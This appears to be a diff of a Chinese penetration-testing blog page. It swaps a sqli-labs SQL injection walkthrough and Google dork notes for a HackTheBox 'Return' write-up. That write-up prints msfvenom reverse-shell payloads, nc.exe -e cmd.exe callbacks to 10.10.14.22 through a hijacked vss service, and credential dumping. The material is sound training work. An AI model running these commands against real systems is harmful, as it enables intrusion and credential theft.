@@ -1,273 +1,61 @@
 <!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>toBePenTester</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="toBePenTester"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="toBePenTester"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="cyhfvg&amp;#39;s Blog."><meta property="og:type" content="blog"><meta property="og:title" content="toBePenTester"><meta property="og:url" content="https://cyhfvg.github.io/"><meta property="og:site_name" content="toBePenTester"><meta property="og:description" content="cyhfvg&amp;#39;s Blog."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cyhfvg.github.io/img/og_image.png"><meta property="article:author" content="cyhfvg"><meta property="article:tag" content="cyhfvg blog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyhfvg.github.io"},"headline":"toBePenTester","image":["https://cyhfvg.github.io/img/og_image.png"],"author":{"@type":"Person","name":"cyhfvg"},"publisher":{"@type":"Organization","name":"toBePenTester","logo":{"@type":"ImageObject","url":{"text":"I wanna be the guy."}}},"description":"cyhfvg&#39;s Blog."}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">I wanna be the guy.</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-01-03T12:20:00.000Z" title="1/3/2022, 8:20:00 PM">2022-01-03</time>发表</span><span class="level-item"><time dateTime="2022-01-03T12:20:00.000Z" title="1/3/2022, 8:20:00 PM">2022-01-03</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">7 分钟读完 (大约1002个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-sqliLabs-0x01/">something about sqliLabs 0x01</a></h1><div class="content"><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><p><a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/sqli-labs">备份地址</a></p>
-<h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><blockquote>
-<p>Get - Error based - Single quotes - String<br></p>
-</blockquote>
-<blockquote>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
-</blockquote>
-<p>注入点是<code>id</code>，正常<code>url</code>为<code>http://train.com/Less-1/?id=1</code>。</p>
-<p>注入<code>id=10&#39;or+true</code>，会有报错信息(多余<code>&#39;</code>)，重新注入<code>id=10&#39;or+true%23</code>，<code>%23</code>为<code>#</code>,
-注释掉尾部的剩余<code>sql语句</code>。</p>
-<ul>
-<li><p>确认显示列</p>
-<p>  注入<code>?id=1&#39;+and+false+union+select+1,2,3+--+</code>，页面上显示<code>2,3</code>，因此显示列为第2列与第3列。</p>
-</li>
-<li><p>获取敏感信息</p>
-<p>  利用获取的显示列，构造sql，将敏感信息放置在第2列与第3列中显示在页面上。<br></p>
-<p>  注入<code>?id=1&#39;+and+false+union+select+1,version(),database()+--+</code>，可以获得数据库版本号
-  与数据库名。<br></p>
-<ul>
-<li><p>获取数据库名</p>
-<p>  注入<code>?id=1&#39;+and+false+union+select+1,(select+group_concat(schema_name)+from+information_schema.schemata),database()+--+</code>，
-  可以获得当前数据库用户 <strong>所有数据库</strong> (从<code>information_schema</code>库的<code>schemata</code>表中拼接<code>schema_name</code>获得)。<br></p>
-</li>
-<li><p>获取数据表名</p>
-<p>  获取库名的状态下，可以根据目标库名，获取表名。<br>
-  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(table_name)+from+information_schema.tables+where table_schema=&#39;security&#39;),database()+--+</code>，
-  可以获得目标数据库的所有表名(从<code>information_schema</code>库的<code>tables</code>表中拼接<code>table_name</code>获得)。</p>
-</li>
-<li><p>获取列名</p>
-<p>  获取表名的状态下，可以根据目标表名，获取对应的字段名。<br>
-  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(column_name)+from+information_schema.columns+where table_name=&#39;users&#39;),database()+--+</code>，
-  可以获得目标表的所有字段名(从<code>information_schema</code>库的<code>columns</code>表中拼接<code>column_name</code>获得)。</p>
-</li>
-<li><p>获取关心信息</p>
-<p>  获取字段名后，还有什么是获取不到的呢？<br>
-  <code>?id=1&#39;+and+false+union+select+1,(select+group_concat(username)+from+security.users),(select+group_concat(password)+from+security.users)+--+</code>，
-  可以获得所有用户的用户名及其对应的密码。</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><blockquote>
-<p>Get - Error based - Integer based</p>
-</blockquote>
-<blockquote>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
-</blockquote>
-<p><a href="#Less-1">与Less-1相同</a></p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><blockquote>
-<p>Get - Error based - Single quotes with twist - String</p>
-</blockquote>
-<blockquote>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
-</blockquote>
-<p>相比<code>Less-1</code>，还需要闭合括号<code>()</code>，其它与<a href="#Less-1">Less-1</a>相同。</p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote>
-<p>Get - Error based - Double quotes - String</p>
-</blockquote>
-<blockquote>
-<p><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code><br>
-<code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></p>
-</blockquote>
-<p>此次以<code>&quot;</code>(双引号)包裹参数，因此尝试闭合<code>&quot;</code>。<br></p>
-<p>实际上当尝试注入<code>id=1&#39;+and+false+--+</code>，却返回结果时，就应该考虑更换闭合方式。<br></p>
-<p>成功闭合后，即与<a href="#Less-1">Less-1</a>相同。</p>
-<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><blockquote>
-<p>Get - Double Injection - Single quotes - String</p>
-</blockquote>
-<blockquote>
-<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
-</blockquote>
-<p>实际尝试后，注入<code>?id=1&#39;+and+false+--+</code>与<code>?id=1&#39;+or+true+--+</code>页面反应不同样，即标志着确实有注入点。<br></p>
-<p>只是，页面没有显示信息，如何获取信息呢？<br>
-并非没有办法。此处sql语句错误时，会输出错误信息，因此恶意构造sql语句，将关心信息藏在
-报错输出中。<br></p>
-<ul>
-<li><p>Duplicate entry</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> <span class="number">1</span>                           <span class="comment">-- 检索y的值(1)</span></span><br><span class="line">    <span class="keyword">from</span> (                             <span class="comment">-- 括号必需</span></span><br><span class="line">        <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line">            ,concat(                   <span class="comment">-- 利用 concat函数拼接内容,起别名为x</span></span><br><span class="line">                <span class="number">0x23</span>                   <span class="comment">-- 拼接#符号,分隔信息</span></span><br><span class="line">                ,($PAYLOAD)            <span class="comment">-- payload</span></span><br><span class="line">                ,<span class="number">0x23</span></span><br><span class="line">                ,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)      <span class="comment">-- floor函数与count(*)，group by,结合使用来报错</span></span><br><span class="line">                ) <span class="keyword">as</span> x</span><br><span class="line">        <span class="keyword">from</span> information_schema.tables</span><br><span class="line">        <span class="keyword">group</span> <span class="keyword">by</span> x                     <span class="comment">-- floor产生的0/1序列，group by 时会报错</span></span><br><span class="line">    ) <span class="keyword">as</span> y</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>toBePenTester</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="toBePenTester"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="toBePenTester"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="cyhfvg&amp;#39;s Blog."><meta property="og:type" content="blog"><meta property="og:title" content="toBePenTester"><meta property="og:url" content="https://cyhfvg.github.io/"><meta property="og:site_name" content="toBePenTester"><meta property="og:description" content="cyhfvg&amp;#39;s Blog."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cyhfvg.github.io/img/og_image.png"><meta property="article:author" content="cyhfvg"><meta property="article:tag" content="cyhfvg blog"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cyhfvg.github.io"},"headline":"toBePenTester","image":["https://cyhfvg.github.io/img/og_image.png"],"author":{"@type":"Person","name":"cyhfvg"},"publisher":{"@type":"Organization","name":"toBePenTester","logo":{"@type":"ImageObject","url":{"text":"I wanna be the guy."}}},"description":"cyhfvg&#39;s Blog."}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">I wanna be the guy.</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-08-02T15:43:56.000Z" title="8/2/2023, 11:43:56 PM">2023-08-02</time>发表</span><span class="level-item"><time dateTime="2023-08-02T15:43:56.000Z" title="8/2/2023, 11:43:56 PM">2023-08-02</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">6 分钟读完 (大约925个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/hackthebox-return-401/">hackthebox-return-401</a></h1><div class="content"><h1 id="hackthebox-return"><a href="#hackthebox-return" class="headerlink" title="hackthebox return"></a>hackthebox return</h1><p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/401">return</a></p>
+<h2 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h2><p>使用rustscan 扫描目标地址后发现多个端口开放，其中80是http服务。使用gobuster目录爆破，发现
+<code>http://10.10.11.108/settings.php</code>链接.</p>
+<h2 id="services"><a href="#services" class="headerlink" title="services"></a>services</h2><p>settings.php页面上发现有保存的ldap用户名.
+<img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-34-05-htb-return-web-settings.png" alt="保存的ldap用户名" title="settings.php">
+点击update按钮触发post请求,请求体中有ip字段,值为目标域名<code>printer.return.local</code>。<br/></p>
+<h2 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h2><p>将请求体中的ip换成自己机器的ip，并且使用responder监听ldap服务.<br/></p>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-26-28-htb-return-listen-with-responder.png" alt="使用responder 监听ldap服务端口" title="responder监听389端口期待回连后得到用户认证信息"><br/></p>
+<p>使用burp 修改settings.php 请求.
+<img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-27-15-htb-return-invoke-auth.png" alt="burp 修改settings.php 请求" title="settings.php 请求修改ip value"><br/></p>
+<p>发送请求后,responder处得到目标机器发起的ldap认证信息(用户名/密码);</p>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-27-48-htb-return-get-pass.png" alt="respnoder 得到ldap服务认证信息" title="responder 得到ldap用户名/密码"><br/></p>
+<p>使用evil-winrm使用ldap用户信息尝试登录:登录成功。<br/></p>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-37-14-htb-return-evil-winrm.png" alt="evil-winrm 尝试登录" title="evil-winrm尝试登录"><br/></p>
+<h2 id="priv-esca"><a href="#priv-esca" class="headerlink" title="priv esca"></a>priv esca</h2><p>枚举信息，发现svc-printer用户在用户组(<em>Server Operators</em> group)中，<br/>
+<img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-32-25-htb-return-enum-user.png" alt="用户在Server Operators组" title="Server Operators">
+根据<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">文档</a>
+显示此用户组成员具有<em>以交互方式登录服务器、创建和删除网络共享资源、启动和停止服务、备份和还原文件、格式化计算机的硬盘驱动器以及关闭服务器</em> 。<br/>
+因为它具有启动/停止服务的权限，尝试使用<code>sc.exe create ...</code>创建服务失败后，使用修改常见服务的方式执行恶意文件。</p>
+<ol>
+<li>准备恶意文件</li>
+</ol>
+<p>nc.exe即可，这里使用msf payload<br/></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=9002 EXITFUNC=thread -e x86/shikata_ga_nai -i 10 -f exe -o rev.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-35-19-htb-return-msfvenom.png" alt="msfvenom生成payload" title="msfvenom create msf payload"></p>
+<ol start="2">
+<li>msf 监听payload</li>
+</ol>
+<p>使用<em>multi/handler</em>监听对应payload;
+服务启动后大约持续5s，即会停止进程;防止连接关闭，设置msf自动migrate进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> EXITFUNC thread</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.22</span><br><span class="line"><span class="built_in">set</span> lport 9002</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line"><span class="built_in">set</span> AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure>
 
-<p>  使用公式<code>and+(+select+1+from+(+select+count(*)+,concat(0x23,($PAYLOAD),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+</code>,<br>
-  构造payload，<code>?id=100&#39;+and+(+select+1+from+(+select+count(*)+,concat(0x23,(select+database()),0x23,floor(rand(0)*2))as+x+from+information_schema.tables+group+by+x+)as+y+)+--+</code>。</p>
-</li>
-<li><p>updatexml报错</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(                        <span class="comment">-- 括号必需</span></span><br><span class="line">    updatexml(<span class="number">1</span></span><br><span class="line">        ,concat($PAYLOAD <span class="comment">-- ~(0x7e)是非法字符，一定会报错</span></span><br><span class="line">            ,<span class="number">0x7e</span>)</span><br><span class="line">        ,<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-32-46-htb-return-msf-multi-handler.png" alt="msf multi/handler" title="msf multi/handler"></p>
+<ol start="3">
+<li>执行msf payload</li>
+</ol>
+<p>通过evil-winrm的 upload方法上传恶意文件,然后修改vss(卷影复制服务,<em>Volume Shadow Copy Service</em>)。</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置vss服务 可执行文件路径为 msf payload path</span></span><br><span class="line">sc.exe config vss binpath= <span class="string">&quot;C:\windows\tasks\rev.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启vss服务</span></span><br><span class="line">sc.exe stop vss ; sc.exe <span class="built_in">start</span> vss</span><br></pre></td></tr></table></figure>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-36-17-htb-return-upload-msf-payload.png" alt="evil-winrm upload恶意文件" title="upload msf payload"></p>
+<h2 id="post"><a href="#post" class="headerlink" title="post"></a>post</h2><p>使用msf的<em>post/windows/gather/smart_hashdump</em>模块，执行后利用，dump 用户密码hash.
+<img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-33-30-htb-return-msf-smart-hashdump.png" alt="msf smart_hashdump" title="msf smart hashdump"></p>
+<h2 id="other-func"><a href="#other-func" class="headerlink" title="other func"></a>other func</h2><p>不使用msf payload,使用普通nc.exe.</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改vss可执行文件路径位置 并 提供执行参数</span></span><br><span class="line">sc.exe config vss binpath= <span class="string">&quot;C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.22 9002&quot;</span></span><br><span class="line"></span><br><span class="line">sc.exe stop vss; sc.exe <span class="built_in">start</span> vss</span><br></pre></td></tr></table></figure>
 
-<p>  <code>updatexml(XML_document, XPath_string, new_value)</code>，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
-<p>  使用公式，<code>and+(updatexml(1,cancat(database(),0x7e),1))+--+</code>,
-  构造payload，<code>?id=99&#39;+and+(updatexml(1,cancat(database(),0x7e),1))+--+</code>。</p>
-</li>
-<li><p>extractvalue报错</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span></span><br><span class="line">(                       <span class="comment">-- 括号必需</span></span><br><span class="line">    extractvalue(<span class="number">1</span>,</span><br><span class="line">        cancat($PAYLOAD</span><br><span class="line">        ,<span class="number">0x7e</span>)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cyhfvg-images.oss-cn-shanghai.aliyuncs.com/2023-07-31%2023-31-38-htb-return-nc-reverse-shell.png" alt="使用nc.exe获得反弹shell" title="nc reverse shell"></p>
+<p>得到nc反弹shell后，立刻在此shell中再使用nc.exe创建另一个稳定反弹shell.</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\tasks\nc.exe <span class="literal">-e</span> cmd.exe <span class="number">10.10</span>.<span class="number">14.22</span> <span class="number">9003</span></span><br></pre></td></tr></table></figure>
 
-<p>  <code>extractvalue(XML_document, XPath_string)</code>,与<code>updatexml()</code>函数相同，当<code>XPath_string</code>格式出现错误时，mysql会报语法错误。</p>
-<p>  使用公式<code>and+(extractvalue(1,cancat($PAYLOAD,0x7e)))+--+</code>,构造payload，<code>?id=99&#39;+and+(extractvalue(1,cancat(database(),0x7e)))+--+</code>。</p>
-</li>
-</ul>
-</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql-injection/">sql injection, </a><a class="link-muted" rel="tag" href="/tags/sqli-labs/">sqli-labs </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-26T14:11:54.000Z" title="12/26/2021, 10:11:54 PM">2021-12-26</time>发表</span><span class="level-item"><time dateTime="2021-12-26T14:11:54.000Z" title="12/26/2021, 10:11:54 PM">2021-12-26</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/skills/">skills</a></span><span class="level-item">4 分钟读完 (大约614个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-search-skills/">something about search skills</a></h1><div class="content"><h1 id="搜索引擎使用技巧"><a href="#搜索引擎使用技巧" class="headerlink" title="搜索引擎使用技巧"></a>搜索引擎使用技巧</h1><h2 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h2><ul>
-<li><p>精确关键词</p>
-<p>  使用<code>&quot;</code>将关键词包裹起来，可以达到精确搜索的目的。如<code>&quot;abc def&quot;</code>为精确包含<code>abc def</code>
-  内容的站点，仅包含<code>abc</code>是不会匹配的。</p>
-</li>
-<li><p>排除内容</p>
-<p>  使用<code>-xxx</code>可以排除包含<code>xxx</code>的内容。</p>
-</li>
-<li><p>逻辑或</p>
-<p>  使用<code>abc OR def</code>，可以搜索包含<code>abc</code>或者包含<code>def</code>的内容。</p>
-</li>
-<li><p>通配符</p>
-<p>  使用<code>*</code>可以通配内容,达到模糊检索的目的，如<code>*与莫蒂</code>。</p>
-</li>
-<li><p><code>intitle:</code></p>
-<p>  使用<code>intitle:xxx</code>可以匹配标题关键字<code>xxx</code>。</p>
-</li>
-<li><p><code>inurl:</code></p>
-<p>  <code>inurl:xxx</code>搜索<code>url</code>中存在<code>xxx</code>内容的站点。
-  如：<code>inurl:php?id=1</code></p>
-</li>
-<li><p><code>intext:</code></p>
-<p>  使用<code>intext:xxx</code>可以检索主体包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>related:</code></p>
-<p>  使用<code>related:xxx</code>可以检索与<code>xxx</code>相关联的站点内容。</p>
-</li>
-<li><p><code>filetype:xxx</code></p>
-<p>  检索文件后缀名为<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>site:</code></p>
-<p>  <code>site:xxx.yyy</code>,搜索<code>xxx.yyy</code>站点内的内容。如<code>site:xxx.yyy 搜索引擎使用技巧</code>。
-  可以搭配其它技巧使用。</p>
-<ul>
-<li><p>查找后台地址</p>
-<ul>
-<li><p><code>site:xxx.yyy 管理后台/登陆/管理员/系统</code></p>
-</li>
-<li><p><code>site:xxx.yyy inurl:login/admin/system/guanli/denglu</code></p>
-</li>
-</ul>
-</li>
-<li><p>敏感文件</p>
-<ul>
-<li><p><code>site:xxx.yyy filetype:pdf/doc/xls/conf</code></p>
-</li>
-<li><p><code>site:xxx.yyy filetype:log/sql/conf</code></p>
-</li>
-</ul>
-</li>
-<li><p>上传漏洞</p>
-<ul>
-<li><code>site:xxx.yyy inurl:file</code></li>
-<li><code>site:xxx.yyy inurl:load</code></li>
-</ul>
-</li>
-<li><p>邮箱/QQ/群</p>
-<ul>
-<li><p><code>site:xxx.yyy 邮件/email</code></p>
-</li>
-<li><p><code>site:xxx.yyy qq/QQ/群/企鹅/腾讯</code></p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="Google语法-1"><a href="#Google语法-1" class="headerlink" title="Google语法"></a>Google语法</h2><ul>
-<li><p><code>in:name</code></p>
-<p>  使用<code>in:name xxx</code>，可以检索仓库 <strong>标题</strong> 中含有<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>in:description</code></p>
-<p>  使用<code>in:description xxx</code>，可以检索仓库 <strong>描述</strong> 中含有<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>in:readme</code></p>
-<p>  使用<code>in:readme xxx</code>，可以检索仓库 <strong>README</strong> 中含有<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>forks:</code></p>
-</li>
-<li><p><code>stars:</code></p>
-<p>  使用<code>stars:&gt;3000 xxx</code>，可以检索<code>star</code>数量大于3000,包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>forks:min..max</code></p>
-</li>
-<li><p><code>stars:min..max</code></p>
-<p>  使用<code>stars:1000..3000 xxx</code>，可以检索<code>star</code>数量在1000至3000之间,包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>size:</code></p>
-<p>  使用<code>size:&gt;=5000 xxx</code>，可以检索仓库大小在<code>5000kb</code>之上，包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>pushed:</code></p>
-<p>  使用<code>pushed:&gt;2021-12-26 xxx</code>，可以检索<code>推送时间</code>大于<code>2021/12/26</code>，包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>created:</code></p>
-<p>  使用<code>created:&gt;2021-12-26 xxx</code>，可以检索<code>仓库创建时间</code>大于<code>2021/12/26</code>，包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>user:</code></p>
-<p>  使用<code>user:xxx</code>检索 <strong>用户名</strong> 为<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>license:</code></p>
-<p>  使用<code>license:apache-2.0 xxx</code>，可以检索开源协议为<code>apache-2.0</code>，包含<code>xxx</code>的内容。</p>
-</li>
-<li><p><code>language:</code></p>
-<p>  使用<code>language:python xxx</code>，可以检索 <strong>开发语言</strong> 为<code>python</code>，包含<code>xxx</code>的内容。</p>
-</li>
-</ul>
